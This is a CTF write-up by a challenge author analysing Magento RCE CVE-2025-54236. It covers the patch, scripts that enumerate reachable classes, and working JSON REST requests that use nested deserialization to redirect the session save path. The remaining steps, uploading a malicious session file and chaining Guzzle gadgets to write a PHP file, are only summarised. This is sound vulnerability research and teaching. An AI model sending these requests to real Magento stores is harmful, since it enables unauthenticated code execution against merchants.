# This challenge has been ruined

This challenge is a reproduction of last month’s Magento RCE vulnerability **CVE-2025-54236**. When I planned this challenge the vulnerability hadn't (apparently) attracted much attention and there were almost no analyses. In practice, lots of sites use Magento, so the real impact is quite severe.

When I started my independent analysis of the bug, the only information I could get was:

> Our security team successfully reproduced one possible avenue to exploit SessionReaper, but there are likely multiple vectors. While we cannot disclose technical details that could aid attackers, the vulnerability follows a familiar pattern from last year's CosmicSting attack. The attack combines a malicious session with a nested deserialization bug in Magento's REST API.
> The specific remote code execution vector appears to require file-based session storage. However, we recommend merchants using Redis or database sessions to take immediate action as well, as there are multiple ways to abuse this vulnerability. -- sansec.io

and the CosmicSting analysis: [https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102).

and the patch for this vulnerability: [https://github.com/magento/magento2/commit/8075ae19428870e3b6e4b8f9e0705389328d4515](https://github.com/magento/magento2/commit/8075ae19428870e3b6e4b8f9e0705389328d4515).

From the clues above we can infer that this RCE is related to **Session**, and that the vulnerability form is similar to the previous XXE vulnerability.

However, just as I was about to use it as a challenge for this year’s N1CTF, [slcyber.io](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/) suddenly published an analysis of the same vulnerability—only a week before the competition. That was really discouraging, and I even considered abandoning the challenge. Still, the exploitation technique itself is so clever that I decided to release it anyway. I just had to remove some parts of the code to keep it from being instantly solved. =_=

What’s really interesting is that the author of CVE-2025-54236, Blaklis@The Flat Network Society, actually solved this challenge based on his own CVE.

## Start from the patch

First look at the patched file `lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php`

```php
private function getConstructorData(string $className, array $data): array
{
    $preferenceClass = $this->config->getPreference($className);
    $class = new ClassReflection($preferenceClass ?: $className);

    try {
        $constructor = $class->getMethod('__construct');
    } catch (\ReflectionException $e) {
        $constructor = null;
    }

    if ($constructor === null) {
        return [];
    }

    $res = [];
    $parameters = $constructor->getParameters();
    foreach ($parameters as $parameter) {
        if (isset($data[$parameter->getName()])) {
            $parameterType = $this->typeProcessor->getParamType($parameter);

            // Code added by the patch
            // Allow only simple types or Api Data Objects
            if (!($this->typeProcessor->isTypeSimple($parameterType)
                || preg_match('~\\\\?\w+\\\\\w+\\\\Api\\\\Data\\\\~', $parameterType) === 1
            )) {
                continue;
            }

            try {
                $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
            } catch (\ReflectionException $e) {
                // Parameter was not correctly declared or the class is unknown.
                // By not returning the constructor value, we will automatically fall back to the "setters" way.
                continue;
            }
        }
    }

    return $res;
}
```

`getConstructorData` does the following:

1. Get the incoming `$className` and find its `preferenceClass`. Because sometimes `$className` is an interface, `preferenceClass` is the default concrete class that implements the interface.
2. Retrieve the constructor of the given class, then get every parameter of that constructor.
3. Iterate over all parameters and perform the following:

   1. Check whether the parameter name exists in the incoming array `$data`; if it does:
   2. Get the parameter type, and convert the corresponding value from the input `$data` to the type required by the parameter.
   3. Save the converted instance.

The patch restricts parameter types: they must be either simple types (string, int, etc.) or classes matching the `xxx\xxx\Api\Data\xxx` pattern.

Now look at what `convertValue` does:

```php
public function convertValue($data, $type)
{
    if ($this->typeProcessor->isArrayType($type) && isset($data['item'])) {
        $data = $this->_removeSoapItemNode($data);
    }

    if ($this->typeProcessor->isTypeSimple($type) || $this->typeProcessor->isTypeAny($type)) {
        return $this->typeProcessor->processSimpleAndAnyType($data, $type);
    }

    if ($type == TypeProcessor::UNSTRUCTURED_ARRAY) {
        return $data;
    }

    return $this->processComplexTypes($data, $type);
}
```

`convertValue` checks whether the incoming type is an array, a simple type (string, int, etc.), or Any, and then processes accordingly. For custom classes it goes into `processComplexTypes`.

```php
private function processComplexTypes($data, $type)
{
    $isArrayType = $this->typeProcessor->isArrayType($type);

    if (!$isArrayType) {
        return $this->_createFromArray($type, $data);
    }

    $result = is_array($data) ? [] : null;
    $itemType = $this->typeProcessor->getArrayItemType($type);

    if (is_array($data)) {
        $this->serviceInputValidator->validateComplexArrayType($itemType, $data);
        foreach ($data as $key => $item) {
            $result[$key] = $this->_createFromArray($itemType, $item);
        }
    }

    return $result;
}
```

In `processComplexTypes` it will call `_createFromArray` to construct the object(s) from the provided data.

```php
protected function _createFromArray($className, $data)
{
    $data = is_array($data) ? $data : [];
    // convert to string directly to avoid situations when $className is object
    // which implements __toString method like \ReflectionObject
    $className = (string) $className;
    if (is_subclass_of($className, \SimpleXMLElement::class)
        || is_subclass_of($className, \DOMElement::class)) {
        throw new SerializationException(
            new Phrase('Invalid data type')
        );
    }
    $class = new ClassReflection($className);
    if (is_subclass_of($className, self::EXTENSION_ATTRIBUTES_TYPE)) {
        $className = substr($className, 0, -strlen('Interface'));
    }

    // Primary method: assign to constructor parameters
    $constructorArgs = $this->getConstructorData($className, $data);
    $object = $this->objectManager->create($className, $constructorArgs);

    // Secondary method: fallback to setter methods
    foreach ($data as $propertyName => $value) {
        if (isset($constructorArgs[$propertyName])) {
            continue;
        }

        // Converts snake_case to uppercase CamelCase to help form getter/setter method names
        // This use case is for REST only. SOAP request data is already camel cased
        $camelCaseProperty = SimpleDataObjectConverter::snakeCaseToUpperCamelCase($propertyName);
        try {
            $methodName = $this->getNameFinder()->getGetterMethodName($class, $camelCaseProperty);
            if (!isset($this->methodReflectionStorage[$className . $methodName])) {
                $this->methodReflectionStorage[$className . $methodName] = $class->getMethod($methodName);
            }
            $methodReflection = $this->methodReflectionStorage[$className . $methodName];
            if ($methodReflection->isPublic()) {
                $returnType = $this->typeProcessor->getGetterReturnType($methodReflection)['type'];
                try {
                    $setterName = $this->getNameFinder()->getSetterMethodName($class, $camelCaseProperty);
                } catch (\Exception $e) {
                    if (empty($value)) {
                        continue;
                    } else {
                        throw $e;
                    }
                }
                try {
                    if ($camelCaseProperty === 'CustomAttributes') {
                        $setterValue = $this->convertCustomAttributeValue($value, $className);
                    } else {
                        $setterValue = $this->convertValue($value, $returnType);
                    }
                } catch (SerializationException $e) {
                    throw new SerializationException(
                        new Phrase(
                            'Error occurred during "%field_name" processing. %details',
                            ['field_name' => $propertyName, 'details' => $e->getMessage()]
                        )
                    );
                }
                if (is_string($setterValue) && $this->validateParamsValue($setterValue)) {
                    throw new InputException(
                        new Phrase(
                            '"%field_name" does not contains valid value.',
                            ['field_name' => $propertyName]
                        )
                    );
                }
                $this->serviceInputValidator->validateEntityValue($object, $propertyName, $setterValue);
                $object->{$setterName}($setterValue);
            }
        } catch (\LogicException $e) {
            $this->processInputErrorForNestedSet([$camelCaseProperty]);
        }
    }

    if ($object instanceof SearchCriteriaInterface) {
        $this->defaultPageSizeSetter->processSearchCriteria($object, $this->defaultPageSize);
    }

    return $object;
}
```

`_createFromArray` has a complex flow. In short, its job is:

1. Recursively call `getConstructorData` to collect constructor parameters for `$className`.
2. Use `objectManager->create` to call `$className`’s constructor with those arguments. (**Point 1**)
3. For any fields not covered by the constructor, try to call their setter methods. (**Point 2**)

Combining this with the patch we get a clear direction: calling an arbitrary class’s constructor or invoking a setter that internally performs session-related logic can lead to code execution. This feels similar to the infamous Fastjson gadget chains (which is one reason I found this bug interesting).

## Finding usable classes

When I tried to search for potentially usable classes I was amazed — Magento’s huge, complex codebase made it hard to know where to start.

So I tried to simulate the execution of `getConstructorData` to find all classes that might be instantiated. Given the hint that this vulnerability is an **unauthenticated** nested-deserialization exposure in the **REST API**, we can list all REST API routes that don't require authentication.

REST routes are processed in `vendor/magento/module-webapi/Model/Rest/Config.php` in the `getRestRoutes` function (you can find it by placing a few breakpoints on the request call chain). In that function I inserted code to export all routes:

```php
public function getRestRoutes(\Magento\Framework\Webapi\Rest\Request $request)
{
    $requestHttpMethod = $request->getHttpMethod();
    $servicesRoutes = $this->_config->getServices()[Converter::KEY_ROUTES];

    // Inserted code
    $all_acl = [];
    foreach ($servicesRoutes as $url => $httpMethods) {
        foreach ($httpMethods as $httpMethod => $methodInfo) {
            $acl = array_keys($methodInfo[Converter::KEY_ACL_RESOURCES]);
            $all_acl = array_merge($all_acl, $acl);
            if(in_array("anonymous",$acl)) {
                file_put_contents('/tmp/routes.log', $httpMethod . ' ' 
                . $url . ' '
                . $methodInfo[Converter::KEY_SERVICE][Converter::KEY_SERVICE_CLASS] . ' ' 
                . $methodInfo[Converter::KEY_SERVICE][Converter::KEY_SERVICE_METHOD] . ' '
                ."\n", FILE_APPEND);
            }
        }
    }
```

Then I obtained a list of roughly 200 routes, for example:

```
GET /V1/directory/currency Magento\Directory\Api\CurrencyInformationAcquirerInterface getCurrencyInfo 
GET /V1/directory/countries Magento\Directory\Api\CountryInformationAcquirerInterface getCountriesInfo 
GET /V1/directory/countries/:countryId Magento\Directory\Api\CountryInformationAcquirerInterface getCountryInfo 
POST /V1/customers Magento\Customer\Api\AccountManagementInterface createAccount 
GET /V1/customers/:customerId/password/resetLinkToken/:resetPasswordLinkToken Magento\Customer\Api\AccountManagementInterface validateResetPasswordLinkToken 
PUT /V1/customers/password Magento\Customer\Api\AccountManagementInterface initiatePasswordReset 
POST /V1/customers/resetPassword Magento\Customer\Api\AccountManagementInterface resetPassword 
POST /V1/customers/isEmailAvailable Magento\Customer\Api\AccountManagementInterface isEmailAvailable 
POST /V1/integration/admin/token Magento\TwoFactorAuth\Api\AdminTokenServiceInterface createAdminAccessToken 
POST /V1/integration/customer/token Magento\Integration\Api\CustomerTokenServiceInterface createCustomerAccessToken 
GET /V1/search Magento\Search\Api\SearchInterface search 
GET /V1/products-render-info Magento\Catalog\Api\ProductRenderListInterface getList 
GET /V1/guest-carts/:cartId Magento\Quote\Api\GuestCartRepositoryInterface get 
POST /V1/guest-carts Magento\Quote\Api\GuestCartManagementInterface createEmptyCart 
PUT /V1/guest-carts/:cartId/order Magento\Quote\Api\GuestCartManagementInterface placeOrder 
GET /V1/guest-carts/:cartId/shipping-methods Magento\Quote\Api\GuestShippingMethodManagementInterface getList 
POST /V1/guest-carts/:cartId/estimate-shipping-methods Magento\Quote\Api\GuestShipmentEstimationInterface estimateByExtendedAddress 
GET /V1/guest-carts/:cartId/items Magento\Quote\Api\GuestCartItemRepositoryInterface getList 
POST /V1/guest-carts/:cartId/items Magento\Quote\Api\GuestCartItemRepositoryInterface save 
PUT /V1/guest-carts/:cartId/items/:itemId Magento\Quote\Api\GuestCartItemRepositoryInterface save 
DELETE /V1/guest-carts/:cartId/items/:itemId Magento\Quote\Api\GuestCartItemRepositoryInterface deleteById 
GET /V1/guest-carts/:cartId/selected-payment-method Magento\Quote\Api\GuestPaymentMethodManagementInterface get 
PUT /V1/guest-carts/:cartId/selected-payment-method Magento\Quote\Api\GuestPaymentMethodManagementInterface set 
GET /V1/guest-carts/:cartId/payment-methods Magento\Quote\Api\GuestPaymentMethodManagementInterface getList 
```

These route handlers reference Interfaces, so we need to find the concrete classes implementing those Interfaces, i.e. resolve the `preferenceClass` (my VSCode handled Interfaces pretty poorly). I inserted code into `vendor/magento/framework/ObjectManager/Config/Config.php`'s `getPreference` function:

```php
public function getPreference($type)
{
    $type = $type !== null ? ltrim($type, '\\') : '';
    $preferencePath = [];
    while (isset($this->_preferences[$type])) {
        if (isset($preferencePath[$this->_preferences[$type]])) {
            throw new \LogicException(
                'Circular type preference: ' .
                $type .
                ' relates to ' .
                $this->_preferences[$type] .
                ' and viceversa.'
            );
        }
        $type = $this->_preferences[$type];
        $preferencePath[$type] = 1;
    }

    // Inserted code
    file_put_contents('/tmp/magento_pref.log', "");
    foreach ($this->_preferences as $k => $v) {
        file_put_contents('/tmp/magento_pref.log', "$k => $v" . "\n", FILE_APPEND);
    }
    return $type;
}
```

That produced results showing which implementation is chosen for an interface when instantiated:

```
DateTimeInterface => DateTime
Psr\Log\LoggerInterface => Magento\Framework\Logger\LoggerProxy
Magento\Framework\EntityManager\EntityMetadataInterface => Magento\Framework\EntityManager\EntityMetadata
Magento\Framework\EntityManager\HydratorInterface => Magento\Framework\EntityManager\Hydrator
Magento\Framework\View\Template\Html\MinifierInterface => Magento\Framework\View\Template\Html\Minifier
Magento\Framework\Model\Entity\ScopeInterface => Magento\Framework\Model\Entity\Scope
Magento\Framework\ObjectManager\FactoryInterface => Magento\Framework\ObjectManager\Factory\Dynamic\Developer
Magento\Framework\Search\Request\Aggregation\StatusInterface => Magento\LayeredNavigation\Model\Aggregation\Status
Magento\Framework\Search\Adapter\Aggregation\AggregationResolverInterface => Magento\Framework\Search\Adapter\Aggregation\AggregationResolver
Magento\Framework\App\RequestInterface => Magento\Framework\App\Request\Http
Magento\Framework\App\PlainTextRequestInterface => Magento\Framework\App\Request\Http
Magento\Framework\App\RequestContentInterface => Magento\Framework\App\Request\Http
Magento\Framework\App\Request\PathInfoProcessorInterface => Magento\Backend\App\Request\PathInfoProcessor
Magento\Framework\App\ResponseInterface => Magento\Framework\App\Response\Http
Magento\Framework\App\RouterListInterface => Magento\Framework\App\RouterList
Magento\Framework\App\FrontControllerInterface => Magento\Webapi\Controller\Rest
Magento\Framework\App\CacheInterface => Magento\Framework\App\Cache\Proxy
Magento\Framework\App\Cache\StateInterface => Magento\Framework\App\Cache\State
Magento\Framework\App\Cache\TypeListInterface => Magento\Framework\App\Cache\TypeList
Magento\Framework\App\ObjectManager\ConfigWriterInterface => Magento\Framework\App\ObjectManager\ConfigWriter\Filesystem
```

According to `getConstructorData`’s logic, when Magento processes a REST request it finds the class for the route and calls the handler method. For example, `/V1/search` is handled by `Magento\Framework\Search\Search::search`:

```php
public function search(SearchCriteriaInterface $searchCriteria)
{
    $this->requestBuilder->setRequestName($searchCriteria->getRequestName());

    $scope = $this->scopeResolver->getScope()->getId();
    $this->requestBuilder->bindDimension('scope', $scope);
```

The body parameters are used as the `SearchCriteriaInterface`’s `preferenceClass` — i.e. the `SearchCriteria` class — and that class’s constructor arguments may include other class types, which in turn are resolved recursively until only simple types remain.

Therefore we can design a DFS algorithm to enumerate all classes that might be instantiated. The flow:

1. Extract a route.
2. Get the parameter types of the route handler.
3. Get the constructors of those types and add the type to the chosen list.
4. Get constructor parameter types and repeat step 3 until the path is too deep or we reach simple types.
5. Repeat step 1 until all routes are processed.

```php
<?php

use Magento\Framework\App\Bootstrap;
use Magento\Framework\App\ObjectManager;
use Magento\Framework\ObjectManager\ConfigInterface;
use Laminas\Code\Reflection\ClassReflection;
use Magento\Framework\Reflection\TypeProcessor;

try {
    require __DIR__ . '/../app/bootstrap.php';
} catch (\Exception $e) {
    exit(1);
}
$bootstrap = Bootstrap::create(BP, $_SERVER);

/**
 * @var ConfigInterface
 */
$config = ObjectManager::getInstance()->get(ConfigInterface::class);
$typeProcessor = new TypeProcessor();
$all_types = [];

function runall()
{
    global $all_types, $config, $typeProcessor;
    $routesFile = __DIR__ . '/routes.log';
    if (!file_exists($routesFile)) {
        die("routes.log file does not exist\n");
    }
    $routes = file($routesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($routes as $route) {
        // split each line by whitespace
        $parts = preg_split('/\s+/', $route);
        if (count($parts) < 4) {
            continue; // skip malformed lines
        }

        $path = $parts[1]; // element 1: path
        $className = $parts[2]; // element 2: class name
        $methodName = $parts[3]; // element 3: method name

        try {
            // use reflection to get class and method info
            $reflectionClass = new ReflectionClass($className);
            if (!$reflectionClass->hasMethod($methodName)) {
                echo "Class {$className} does not have method {$methodName}\n";
                continue;
            }

            $reflectionMethod = $reflectionClass->getMethod($methodName);
            $parameters = $reflectionMethod->getParameters();

            // echo "Class: {$className}, Method: {$methodName}\n";
            // echo "Parameters:\n";
            // echo "{$className}.{$methodName}\n";
            foreach ($parameters as $parameter) {
                $paramType = $parameter->getType();
                if ($paramType) {
                    checkClass([$path, $className, $parameter->name], $paramType->getName(), $config, $typeProcessor, 1);
                }
            }

            // echo "\n";
        } catch (ReflectionException $e) {
            echo "Reflection error: " . $e->getMessage() . "\n";
        }
    }
}

function checkClass($args, $className, ConfigInterface $config, TypeProcessor $typeProcessor, $depth)
{
    global $all_types;
    try{
        $class = new ClassReflection($className);
    } catch (\ReflectionException $e) {
        //echo "$depth $className (no class)\n";
        return;
    }
    if (is_subclass_of($className, \Magento\Framework\Api\ExtensionAttributesInterface::class)) {
        $className = substr($className, 0, -strlen('Interface'));
    }
    
    $preferenceClass = $config->getPreference($className);
    try {
        $class = new ClassReflection($preferenceClass ?: $className);
        $constructor = $class->getMethod('__construct');
    } catch (\ReflectionException $e) {
        return;
    }

    $t = $class->name;
    if ($t[0] == "\\") {
        $t = substr($t, 1);
    }

    if (in_array($class->name, $all_types)) {
        return;
    }
    if ($depth > 10) {
        //echo "$depth $t (too deep)\n";
        return;
    }

    $all_types = array_merge($all_types, [$class->name]);
    $all_types = array_unique($all_types);

    $parameters = $constructor->getParameters();
    foreach ($parameters as $parameter) {
        try{
            $parameterType = $typeProcessor->getParamType($parameter);
            if ($typeProcessor->isTypeSimple($parameterType) || $typeProcessor->isTypeAny($parameterType)) {
                continue;
            }
            if ($parameterType == "array[]") {
                continue;
            }
            if ($parameterType == ""){
                continue;
            }
            if (strpos($parameterType, '[]') !== false) {
                $parameterType = str_replace('[]', '', $parameterType);
            }
        } catch (\Throwable $e) {
            continue;
        }
        //echo "$depth $parameterType\n";
        $args[] = $parameter->name;
        checkClass($args, $parameterType, $config, $typeProcessor, $depth + 1);
        array_pop($args);
    }
}

runall();

foreach ($all_types as $type) {
    if(preg_match('~\\\\?\w+\\\\\w+\\\\Api\\\\Data\\\\~', $type) != 1){
        echo "use ". $type . ";\n";
    }
}

```

After running this I obtained a list of over 300 classes, for example:

```php
<?php
use Magento\Customer\Model\Data\Customer;
use Magento\Framework\Api\ExtensionAttributesFactory;
use Magento\Framework\Api\AttributeValueFactory;
use Magento\Customer\Model\Metadata\CustomerCachedMetadata;
use Magento\Customer\Model\Metadata\CustomerMetadata;
use Magento\Customer\Model\AttributeMetadataConverter;
```

While analyzing the vulnerability, the phrase “malicious session” was too vague — you can’t easily predict which class’s constructor will touch session operations. So I inspected those ~300 classes one by one (a painful experience — I even considered delegating the task to AI, but then I’d have to build the infra).

In practice the “malicious session” hint is quite specific: classes with **Session** in their class name. The following classes stood out:

```php
<?php
use Magento\Framework\Session\Generic;
use Magento\Framework\Session\SidResolver\Proxy;
use Magento\Backend\Model\Auth\Session;
use Magento\Framework\Message\Session;
use Magento\Framework\Session\Config;
use Magento\Framework\Session\SaveHandler;
use Magento\Framework\Session\SaveHandlerFactory;
use Magento\Framework\Session\SessionMaxSizeConfig;
use Magento\Framework\Session\Validator;
use Magento\Framework\Session\Storage;
use Magento\Framework\Session\SessionStartChecker;
use Magento\Catalog\Model\Session;
```

Among them, `Magento\Framework\Session\Generic`’s parent `Magento\Framework\Session\SessionManager` has a suspicious call to `start()` in its constructor:

```php
public function __construct(
    \Magento\Framework\App\Request\Http $request,
    SidResolverInterface $sidResolver,
    ConfigInterface $sessionConfig,
    SaveHandlerInterface $saveHandler,
    ValidatorInterface $validator,
    StorageInterface $storage,
    \Magento\Framework\Stdlib\CookieManagerInterface $cookieManager,
    \Magento\Framework\Stdlib\Cookie\CookieMetadataFactory $cookieMetadataFactory,
    \Magento\Framework\App\State $appState,
    ?SessionStartChecker $sessionStartChecker = null
) {
    $this->request = $request;
    $this->sidResolver = $sidResolver;
    $this->sessionConfig = $sessionConfig;
    $this->saveHandler = $saveHandler;
    $this->validator = $validator;
    $this->storage = $storage;
    $this->cookieManager = $cookieManager;
    $this->cookieMetadataFactory = $cookieMetadataFactory;
    $this->appState = $appState;
    $this->sessionStartChecker = $sessionStartChecker ?: \Magento\Framework\App\ObjectManager::getInstance()->get(
        SessionStartChecker::class
    );
    $this->start();
}

public function start()
{
    if ($this->sessionStartChecker->check()) {
        if (!$this->isSessionExists()) {
            \Magento\Framework\Profiler::start('session_start');
            ...
            $this->initIniOptions();
            $this->registerSaveHandler();
            ...
        } else {
            $this->validator->validate($this);
        }
        $this->storage->init(isset($_SESSION) ? $_SESSION : []);
    }
    return $this;
}
private function initIniOptions()
{
    $result = ini_set('session.use_only_cookies', '1');
    ...
    foreach ($this->sessionConfig->getOptions() as $option => $value) {
        if ($option === 'session.save_handler' && $value !== 'memcached') {
            continue;
        } else {
            $result = ini_set($option, $value);
            ...
        }
    }
}
```

`start()` calls `initIniOptions`, which reads all options from `sessionConfig` and calls `ini_set` for them.

`sessionConfig` corresponds to the class `Magento\Framework\Session\Config`:

```php
public function __construct(
    \Magento\Framework\ValidatorFactory $validatorFactory,
    \Magento\Framework\App\Config\ScopeConfigInterface $scopeConfig,
    \Magento\Framework\Stdlib\StringUtils $stringHelper,
    \Magento\Framework\App\RequestInterface $request,
    Filesystem $filesystem,
    DeploymentConfig $deploymentConfig,
    $scopeType,
    $lifetimePath = self::XML_PATH_COOKIE_LIFETIME
) {
    $this->_validatorFactory = $validatorFactory;
    $this->_scopeConfig = $scopeConfig;
    $this->_stringHelper = $stringHelper;
    $this->_httpRequest = $request;
    $this->_scopeType = $scopeType;
    $this->lifetimePath = $lifetimePath;
    ...
}

public function setSavePath($savePath)
{
    $this->setOption('session.save_path', $savePath);
    return $this;
}
```

At first glance `Config` is hard to populate via the constructor, but recall **Point 2** above: `_createFromArray` calls setters after object creation. `Config` has a `setSavePath` method that controls the session file save path, which aligns well with the vulnerability description.

So in the chain-finding script I inserted:

```php
if ($t == "Magento\Framework\Session\Generic"){
    $params = array_slice($args, 2);
    echo "$args[0]: " . implode(" -> ", $params) . "\n";
}
```

This produced multiple results like:

```
/V1/guest-carts/:cartId/estimate-shipping-methods: address -> directoryData -> context -> urlDecoder -> urlBuilder -> request -> pathInfoProcessor -> helper -> backendUrl -> session
/V1/guest-carts/:cartId/estimate-shipping-methods: address -> directoryData -> context -> urlDecoder -> urlBuilder -> request -> pathInfoProcessor -> helper -> backendUrl -> formKey -> session
/V1/guest-carts/:cartId/estimate-shipping-methods: address -> directoryData -> context -> urlDecoder -> urlBuilder -> session
```

Choose the shortest path and craft a payload like:

```
POST /rest/all/V1/guest-carts/123/estimate-shipping-methods HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=testing
Content-Length: 417
Content-Type: application/json

{
    "address": {
        "directoryData": {
            "context": {
                "urlDecoder": {
                    "urlBuilder": {
                        "session": {
                            "sessionConfig": {
                                "savePath": "/abc"
                            }
                        }
                    }
                }
            }
        }
    }
}
```

Then in `var/log/exception.log` we can see an error indicating that the session storage location has been changed successfully:

```
Next Exception: Report ID: webapi-690751bea0b53; Message: Warning: SessionHandler::read(): open(/abc/sess_testing, O_RDWR) failed: No such file or directory (2) in /var/www/magento/vendor/magento/framework/Session/SaveHandler/Native.php on line 24 in /var/www/magento/vendor/magento/framework/Webapi/ErrorProcessor.php:208
```

[slcyber.io](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/) used a different entry point, but they didn’t clearly explain how they discovered the particular class that could be exploited.

To avoid the challenge being trivial, I had to remove the Payment class corresponding to `paymentMethod`, to raise the difficulty a bit.

```
PUT /rest/default/V1/guest-carts/abc/order HTTP/1.1
Host: example.com
Accept: application/json
Cookie: PHPSESSID=testing
Connection: close
Content-Type: application/json
Content-Length: 265

{
  "paymentMethod": {
    "paymentData": {
      "context": {
        "urlBuilder": {
          "session": {
            "sessionConfig": {
              "savePath": "does/not/exist"
            }
          }
        }
      }
    }
  }
}
```

## Uploading a malicious session file

PHP session files are stored using PHP serialization, and Magento ships with many dependencies. A straightforward approach is to upload a session file containing malicious serialized data, then change `session.save_path` and include a matching `PHPSESSID` to trigger deserialization.

The upload flow is clearly explained in [slcyber.io](https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-2025-54236/)’s blog — you can read their analysis directly.

## Other notes / caveats

Because this challenge uses a black-box setup, some participants assumed the Magento installation path when exploiting `Guzzle/FW1` deserialization gadgets and failed to write files. You can solve this by using relative paths — writing files into `pub/xxx.php` is sufficient.

## About building a local environment

After the Docker build completes, change the DB host in `/var/www/magento/app/etc/env.php` and point it to the correct database.
